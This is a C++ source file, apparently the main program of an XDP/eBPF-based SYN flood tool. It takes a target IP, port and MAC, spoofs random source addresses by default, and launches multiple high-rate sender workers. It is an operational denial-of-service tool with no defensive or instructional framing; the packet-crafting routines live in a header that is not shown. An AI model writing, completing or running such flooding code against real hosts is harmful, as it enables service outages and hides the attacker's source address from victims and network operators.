#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>

#include "xdp_runtime.h"
#include "xdp_log.h"

#include "synflood.h"
#include "tokenbucket.h"

#define DEFAULT_PROG_PATH "./xdp_kern_prog.o"
void usage(void)
{
    printf("Usage:\n");
    printf("synflood -d ethX -D dst_ip -P dst_port -p ebpf_prog -s workers -M target_mac [-r rate] [-S src_ip]\n");
    printf("-d|--dev      NIC dev [must]\n");
    printf("-D|--dstip    target ip [must]\n");
    printf("-P|--port     target port [must]\n");
    printf("-S|--srcip    source ip, default is random [option]\n");
    printf("-p|--prog     ebpf prog, default is ./xdp_kern_prog.o [option]\n");
    printf("-s|--sender   workers used to send [must]\n");
    printf("-r|--rate     rate-limiting of per sender [option]\n");
    printf("-M|--mac      target MAC addr or local gateway MAC addr [must]\n");
    printf("-h|--help     this help\n");
    exit(0);
}

int main(int argc, char *argv[])
{
    char       *eth = NULL;
    char       *ip = NULL;
    char       *src_ip = NULL;
    char       *prog = NULL;
    char       *mac = NULL;
    uint16_t    port = 0;
    uint16_t    sender = 0;
    int         ret;
    int         c = -1;
    int         option_index;
    uint64_t    packetCount = 0;
    in_addr_t   server_addr;
    struct xdp_runtime runtime;

    struct option long_options[] = {
        {"dev", required_argument, NULL, 'd'},
        {"dstip", required_argument, NULL, 'D'},
        {"port", required_argument, NULL, 'P'},
        {"prog", required_argument, NULL, 'p'},
        {"sender", required_argument, NULL, 's'},
        {"rate", required_argument, NULL, 'r'},
        {"mac", required_argument, NULL, 'M'},
        {"srcip", required_argument, NULL, 'S'},
        {"help", required_argument, NULL, 'h'},
        {NULL, 0, NULL, 0}
    };
    while (1) {
        c = getopt_long(argc, argv, "d:D:p:P:s:r:M:S:h", long_options, &option_index);
        if (c == -1) {
            break;
        }
        switch (c) {
            case 'd':
                eth = strdup(optarg);               
                break;
            case 'D':
                ip = strdup(optarg);
                break;
            case 'P':
                port = atoi(optarg);
                break;
            case 'p':
                prog = strdup(optarg);
                break;
            case 's':
                sender = atoi(optarg);
                break;
            case 'r':
                packetCount = atol(optarg);
                break;
            case 'M':
                mac = strdup(optarg);
                break;
            case 'S':
                src_ip = strdup(optarg);
                break;
            case 'h':
            default:
                usage();
        }
    }
    if (!eth || !eth[0] || !ip || !ip[0] || !port) {
        fprintf(stderr, "argument error !\n");
        usage();
        return -1;
    }

    if (!prog || !prog[0]) {
        prog = strdup(DEFAULT_PROG_PATH);
    }
    SynFlood::setDstAddr(ip, port);
    SynFlood::setSrcAddr(src_ip);
    SynFlood::setRate(packetCount);
    SynFlood::setSignal();
    if (mac && SynFlood::setDstMac(mac) < 0) {
        fprintf(stderr, "set dst mac failed %s\n", mac);
        goto out;
    }

    ret = xdp_runtime_init(&runtime, eth, prog, NULL);
    if (ret < 0) {
        fprintf(stderr, "xdp_runtime_init failed with %s\n", eth);
        goto out;
    }

    ret = xdp_runtime_setup_queue(&runtime, sender, 1024);
    if (ret < 0) {
        fprintf(stderr, "xdp_runtime_setup_queue failed with %s\n", eth);
        goto out;
    }
    TokenBucket::start();
    ret = xdp_runtime_setup_workers(&runtime, SynFlood::sender, sender);
    if (ret < 0) {
        fprintf(stderr, "xdp_runtime_setup_workers failed with %s\n", eth);
        goto out;
    }
    ret = xdp_runtime_startup_workers(&runtime);
    if (ret < 0) {
        fprintf(stderr, "xdp_runtime_startup_workers failed with %s\n", eth);
        goto out;
    }

out:
    xdp_runtime_release(&runtime);
    TokenBucket::stop();
    return 0;
}
